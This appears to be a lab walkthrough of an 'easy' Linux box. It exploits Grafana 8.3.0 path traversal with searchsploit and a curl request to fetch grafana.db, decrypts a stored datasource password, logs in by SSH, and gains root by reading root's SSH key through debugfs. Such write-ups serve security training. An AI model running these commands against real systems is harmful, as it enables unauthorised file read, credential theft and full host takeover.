---
icon: ubuntu
---

# Fanatastic - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.181 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 13:04 EDT
Nmap scan report for 192.168.118.181
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   26.37 ms 192.168.45.1
2   26.38 ms 192.168.45.254
3   26.75 ms 192.168.251.1
4   27.01 ms 192.168.118.181
```

### <mark style="color:$primary;">HTTP port 3000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1367).png" alt=""><figcaption></figcaption></figure>

We have grafana running leaking it's version. I am going to check for an exploit

<figure><img src="../../.gitbook/assets/image (1368).png" alt=""><figcaption></figcaption></figure>

There is a directory traveral exploit I am going to download it

### <mark style="color:$primary;">Grafana 8.3.0 Arbitrary File Read</mark>

```
searchsploit -m 50581
```

```
python3 50581.py -H http://192.168.118.181:3000/
```

<figure><img src="../../.gitbook/assets/image (1369).png" alt=""><figcaption></figcaption></figure>

I tried grabbing the ssh key of prometheus, sysadmin & root but it failed.

Grafana is a CMS so it has a database, let's find out where the default location is

<figure><img src="../../.gitbook/assets/image (1370).png" alt=""><figcaption></figcaption></figure>

I am going to use curl to download the file to my current directory

```
curl --path-as-is "http://192.168.118.181:3000/public/plugins/alertlist/../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

<figure><img src="../../.gitbook/assets/image (1371).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1372).png" alt=""><figcaption></figcaption></figure>

This is a SQLite file. I am going to use the SQLieBrowser it comes with Kali

<figure><img src="../../.gitbook/assets/image (1373).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1374).png" alt=""><figcaption></figcaption></figure>

There is so much stuff in here! The user table is a rabbit hole! DAMN IT!

<figure><img src="../../.gitbook/assets/image (1375).png" alt=""><figcaption></figcaption></figure>

the data source is the right table! I am going to go to the **Browse Data** tab

<figure><img src="../../.gitbook/assets/image (1376).png" alt=""><figcaption></figcaption></figure>

if you scroll to the right you will see the **secure\_json\_data** column there is an encrypted password there

<figure><img src="../../.gitbook/assets/image (1377).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking Grafana AES</mark>

<figure><img src="../../.gitbook/assets/image (1378).png" alt=""><figcaption></figcaption></figure>

Crackstation & john failed

<figure><img src="../../.gitbook/assets/image (1380).png" alt=""><figcaption></figcaption></figure>

It's not base64 encoded

<figure><img src="../../.gitbook/assets/image (1381).png" alt=""><figcaption></figcaption></figure>

there is already a program written in GO to help us decrypt this: [**Github**](https://github.com/jas502n/Grafana-CVE-2021-43798)

```
git clone https://github.com/jas502n/Grafana-CVE-2021-43798.git
```

Replace the variable ‘**dataSourcePassword**’ with the value we discovered in the password field of the uncovered grafana.db file.

<figure><img src="../../.gitbook/assets/image (1382).png" alt=""><figcaption></figcaption></figure>

Now the commands to run it

```
go mod init grafana-cve
go get golang.org/x/crypto@latest
go run AESDecrypt.go
```

<figure><img src="../../.gitbook/assets/image (1383).png" alt=""><figcaption></figcaption></figure>

let's see if this password works for someone. I am going to try and ssh

```
ssh sysadmin@192.168.118.181
```

<figure><img src="../../.gitbook/assets/image (1384).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1385).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Disk Group Privesc</mark>

```
df -h
```

<figure><img src="../../.gitbook/assets/image (1386).png" alt=""><figcaption></figcaption></figure>

We found the root directory

```
debugfs /dev/sda2
```

<figure><img src="../../.gitbook/assets/image (1387).png" alt=""><figcaption></figcaption></figure>

I am going to save the key update its permission and ssh with it

<figure><img src="../../.gitbook/assets/image (1388).png" alt=""><figcaption></figcaption></figure>

Root! I'll be honest Cracking the AES key was annoying
